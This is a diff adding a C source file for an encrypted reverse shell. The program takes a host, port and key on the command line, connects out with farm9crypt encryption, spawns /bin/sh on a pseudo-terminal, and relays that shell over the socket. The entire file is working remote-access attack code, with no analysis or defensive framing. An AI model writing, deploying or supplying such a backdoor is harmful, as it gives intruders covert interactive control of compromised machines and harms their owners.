@@ -1,0 +1,123 @@
+// reference implementation
+
+
+
+#include <stdlib.h>
+#include <pty.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <errno.h>
+#include <sys/ioctl.h>
+
+#include "netcat.h"
+#include "farm9crypt.h"
+#include "polarssl/net.h"
+#include "debug.h"
+#include "shuffle.h"
+
+// configured to call-out only
+//./argv0 <host> <port> <key>
+int main( int argc, char **argv )
+{
+	char	*host = argv[1];
+	char	*port = argv[2];
+	char	*key = argv[3];
+
+	int		netfd;
+	int		pid;
+	int		pty;
+	int		tty;
+	char	*slave;
+
+	if ( argc != 4 )
+	{
+		D( printf( " ! check command line arguments\n" ); )
+		return -1;
+	}
+
+	// TODO: check return value
+	D( printf( " . Initializing shell key value to %s\n", key ); )
+	farm9crypt_init( key );
+
+	if ( net_connect( &netfd, host, atoi( port ) ) != 0 )
+	{
+		D( printf( " ! net_connect() failed\n" ); )
+		return -1;
+	}
+
+#ifdef	LINUX
+	// openpty( int *amaster, int *aslave, char *name, struct termios *termp, struct winsize *winp );
+	if ( openpty( &pty, &tty, NULL, NULL, NULL ) < 0 )
+	{
+		D( perror( " ! openpty()" ); )
+		return -1;
+	}
+
+#if 0
+	slave = ttyname( tty );
+
+	if ( slave == NULL )
+	{
+		D( perror( " ! ttyname()" ); )
+		return -1;
+	}
+#endif
+
+#endif
+
+	pid = fork();
+
+	if ( pid < 0 )
+	{
+		D( perror( " ! fork()" ); )
+		return -1;
+	}
+
+	if ( pid == 0 )
+	{
+		// this is the child
+		close( netfd );
+		close( pty );
+
+		if ( setsid() < 0 )
+		{
+			D( perror( " ! setsid()" ); )
+			return -1;
+		}
+
+#if defined LINUX
+		if ( ioctl( tty, TIOCSCTTY, NULL ) < 0 )
+		{
+			D( perror( " ! ioctl()" ); )
+			return -1;
+		}
+#endif
+		
+		dup2( tty, 0 );
+		dup2( tty, 1 );
+		dup2( tty, 2 );
+
+		if ( tty > 2 )
+		{
+			close( tty );
+		}
+
+		execl( "/bin/sh", "sh", "-c", "/bin/sh", (char *)0 );
+	
+		// not reached
+		return -1;
+	}
+	else
+	{
+		// this is the parent
+		close( tty );
+
+		shuffle( pty, netfd );
+
+		return 0;
+	}
+
+	// not reached
+	return 0;
+}
+
